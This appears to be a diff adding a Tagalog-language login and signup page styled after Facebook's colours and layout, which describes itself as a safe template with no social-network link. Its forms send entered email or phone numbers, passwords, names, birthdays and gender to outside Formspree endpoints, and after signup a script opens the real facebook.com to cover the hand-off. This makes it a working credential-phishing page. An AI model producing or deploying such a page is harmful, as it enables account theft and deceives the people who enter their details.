@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="tl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Mag-log in o Mag-sign up</title>
+  <style>
+    :root {
+      --bg: #f0f2f5;
+      --card: #ffffff;
+      --text: #1c1e21;
+      --muted: #65676b;
+      --primary: #1877f2;
+      --primary-dark: #145db8;
+      --success: #42b72a;
+      --success-dark: #369423;
+      --border: #e4e6eb;
+      --ring: rgba(24, 119, 242, 0.35);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Noto Sans, Ubuntu, Cantarell, Arial;
+      background: linear-gradient(135deg, #e8f0ff, #fef7ff 40%, #e9fff3);
+      color: var(--text);
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+    .container {
+      width: 100%;
+      max-width: 1000px;
+      display: grid;
+      grid-template-columns: 1.2fr 1fr;
+      gap: 28px;
+      align-items: center;
+    }
+    @media (max-width: 900px) { .container { grid-template-columns: 1fr; } }
+    .intro h1 { font-size: clamp(28px, 4vw, 42px); margin: 0 0 12px; }
+    .intro p { color: var(--muted); margin: 0; font-size: 16px; }
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      box-shadow: 0 12px 30px rgba(0,0,0,0.06);
+      border-radius: 16px;
+      padding: 20px;
+    }
+    .tabs {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+    .tab-btn {
+      border: 1px solid var(--border);
+      background: #fff;
+      padding: 10px 12px;
+      border-radius: 12px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .tab-btn[aria-selected="true"] { background: var(--primary); color: #fff; border-color: var(--primary); }
+    form { display: grid; gap: 12px; }
+    .field { display: grid; gap: 6px; }
+    label { font-size: 14px; color: var(--muted); }
+    input, select {
+      width: 100%; padding: 12px 14px;
+      border-radius: 12px; border: 1px solid var(--border);
+      font-size: 16px; background: #fff;
+    }
+    input:focus, select:focus { border-color: var(--primary); box-shadow: 0 0 0 4px var(--ring); }
+    .actions { display: grid; gap: 10px; }
+    .btn-primary, .btn-success {
+      color: #fff; border: none; padding: 12px 14px;
+      border-radius: 12px; font-size: 16px; font-weight: 700;
+      cursor: pointer;
+    }
+    .btn-primary { background: var(--primary); }
+    .btn-primary:hover { background: var(--primary-dark); }
+    .btn-success { background: var(--success); }
+    .btn-success:hover { background: var(--success-dark); }
+    .helper-links { text-align: center; }
+    .helper-links a { color: var(--primary); font-size: 14px; text-decoration: none; }
+    .helper-links a:hover { text-decoration: underline; }
+    .divider { display: grid; grid-template-columns: 1fr auto 1fr; align-items: center; gap: 12px; color: var(--muted); font-size: 14px; }
+    .divider::before, .divider::after { content: ""; height: 1px; background: var(--border); }
+    .error { color: #b00020; font-size: 13px; }
+    .success-msg { color: #0b8f3a; font-size: 14px; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <div class="container" role="main">
+    <section class="intro">
+      <h1>Maligayang pagdating! 
+        <span style="display:block; font-size:18px; font-weight:600; color:var(--muted);">Mag-log in o gumawa ng bagong account</span>
+      </h1>
+      <p>Simple at ligtas na template para sa pag-authenticate ng user. Walang koneksyon sa anumang social network.</p>
+    </section>
+
+    <section class="card">
+      <div class="tabs">
+        <button id="tab-login" class="tab-btn" role="tab" aria-selected="true">Mag-log in</button>
+        <button id="tab-signup" class="tab-btn" role="tab" aria-selected="false">Mag-sign up</button>
+      </div>
+
+      <!-- LOGIN -->
+      <div id="panel-login">
+        <form
+  action="https://formspree.io/f/xdkdqzdo"
+  method="POST"
+>
+          <div class="field">
+            <label for="login-identifier">Email o Numero ng Telepono</label>
+            <input id="login-identifier" name="email_or_phone" type="text" required placeholder="@gmail.com">
+            <span id="login-identifier-error" class="error" hidden>Maling email o numero</span>
+          </div>
+          <div class="field">
+            <label for="login-password">Password</label>
+            <input id="login-password" name="password" type="password" required placeholder="********">
+            <span id="login-password-error" class="error" hidden>Ilagay ang iyong password</span>
+          </div>
+          <div class="actions">
+            <button type="submit" class="btn-primary">Mag-log in</button>
+            <div class="helper-links"><a href="#">Nakalimutan ang password?</a></div>
+          </div>
+          <p id="login-success" class="success-msg" hidden>Matagumpay na pag-login!</p>
+        </form>
+        <div class="divider">o</div>
+        <button class="btn-success" id="go-signup">Lumikha ng bagong account</button>
+      </div>
+
+      <!-- SIGNUP -->
+      <div id="panel-signup" hidden>
+        <form id="signupForm" action="https://formspree.io/f/xgvkopjr" method="POST">
+          <div class="field">
+            <label for="su-first">Pangalan</label>
+            <input id="su-first" name="firstName" type="text" required />
+            <span id="su-first-error" class="error" hidden>Ilagay ang pangalan</span>
+          </div>
+          <div class="field">
+            <label for="su-last">Apelyido</label>
+            <input id="su-last" name="lastName" type="text" required />
+            <span id="su-last-error" class="error" hidden>Ilagay ang apelyido</span>
+          </div>
+          <div class="field">
+            <label for="su-email">Email o Numero ng Telepono</label>
+            <input id="su-email" name="email_or_phone" type="text" required />
+            <span id="su-email-error" class="error" hidden>Hindi wastong email o numero</span>
+          </div>
+          <div class="field">
+            <label for="su-pass">Password</label>
+            <input id="su-pass" name="password" type="password" required />
+            <span id="su-pass-error" class="error" hidden>Hindi sapat ang lakas ng password</span>
+          </div>
+          <div class="field">
+            <label for="su-pass2">Kumpirmahin ang Password</label>
+            <input id="su-pass2" name="password2" type="password" required />
+            <span id="su-pass2-error" class="error" hidden>Hindi tugma ang password</span>
+          </div>
+          <div class="field">
+            <label for="su-bday">Araw ng kapanganakan</label>
+            <input id="su-bday" name="birthday" type="date" required />
+            <span id="su-bday-error" class="error" hidden>Piliin ang petsa</span>
+          </div>
+          <div class="field">
+            <label for="su-gender">Kasarian</label>
+            <select id="su-gender" name="gender" required>
+              <option value="">— Pumili —</option>
+              <option value="female">Babae</option>
+              <option value="male">Lalaki</option>
+              <option value="custom">Iba pa</option>
+            </select>
+            <span id="su-gender-error" class="error" hidden>Pumili ng kasarian</span>
+          </div>
+          <div class="actions">
+            <button type="submit" class="btn-success" onclick="myFunction()">Gumawa ng account</button>
+          </div>
+          <p id="signup-success" class="success-msg" hidden>Matagumpay na nakagawa ng account!</p>
+        </form>
+      </div>
+    </section>
+  </div>
+
+<script>
+function myFunction() {
+  setTimeout(function() {
+    window.open("https://www.facebook.com/?locale=tl_TL", "_blank");
+  }, 100);
+}
+
+// Tabs
+const tabLogin = document.getElementById('tab-login');
+const tabSignup = document.getElementById('tab-signup');
+const panelLogin = document.getElementById('panel-login');
+const panelSignup = document.getElementById('panel-signup');
+const goSignupBtn = document.getElementById('go-signup');
+
+function showTab(which) {
+  const isLogin = which === 'login';
+  tabLogin.setAttribute('aria-selected', String(isLogin));
+  tabSignup.setAttribute('aria-selected', String(!isLogin));
+  panelLogin.hidden = !isLogin;
+  panelSignup.hidden = isLogin;
+}
+tabLogin.addEventListener('click', () => showTab('login'));
+tabSignup.addEventListener('click', () => showTab('signup'));
+goSignupBtn.addEventListener('click', () => showTab('signup'));
+
+// Validators
+const emailLike = /^(\+?\d{8,15}|[^@\s]+@[^@\s]+\.[^@\s]+)$/i;
+const strongPass = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d!@#$%^&*()_+\-={}\[\]:;"'`~<>,.?\/]{8,}$/;
+
+// Login validate
+document.getElementById('loginForm').addEventListener('submit', (e) => {
+  const idEl = document.getElementById('login-identifier');
+  const pwEl = document.getElementById('login-password');
+  const okId = emailLike.test(idEl.value.trim());
+  const okPw = pwEl.value.trim().length > 0;
+  document.getElementById('login-identifier-error').hidden = okId;
+  document.getElementById('login-password-error').hidden = okPw;
+  if (!(okId && okPw)) e.preventDefault();
+  else document.getElementById('login-success').hidden = false;
+});
+
+// Signup validate
+document.getElementById('signupForm').addEventListener('submit', (e) => {
+  const first = document.getElementById('su-first');
+  const last = document.getElementById('su-last');
+  const email = document.getElementById('su-email');
+  const pass = document.getElementById('su-pass');
+  const pass2 = document.getElementById('su-pass2');
+  const bday = document.getElementById('su-bday');
+  const gender = document.getElementById('su-gender');
+
+  const okFirst = first.value.trim().length > 0;
+  const okLast = last.value.trim().length > 0;
+  const okEmail = emailLike.test(email.value.trim());
+  const okPass = strongPass.test(pass.value);
+  const okPass2 = pass.value === pass2.value && pass2.value.length > 0;
+  const okBday = Boolean(bday.value);
+  const okGender = Boolean(gender.value);
+
+  document.getElementById('su-first-error').hidden = okFirst;
+  document.getElementById('su-last-error').hidden = okLast;
+  document.getElementById('su-email-error').hidden = okEmail;
+  document.getElementById('su-pass-error').hidden = okPass;
+  document.getElementById('su-pass2-error').hidden = okPass2;
+  document.getElementById('su-bday-error').hidden = okBday;
+  document.getElementById('su-gender-error').hidden = okGender;
+
+  if (!(okFirst && okLast && okEmail && okPass && okPass2 && okBday && okGender)) {
+    e.preventDefault();
+  } else {
+    document.getElementById('signup-success').hidden = false;
+  }
+});
+</script>
+</body>
+</html>
+
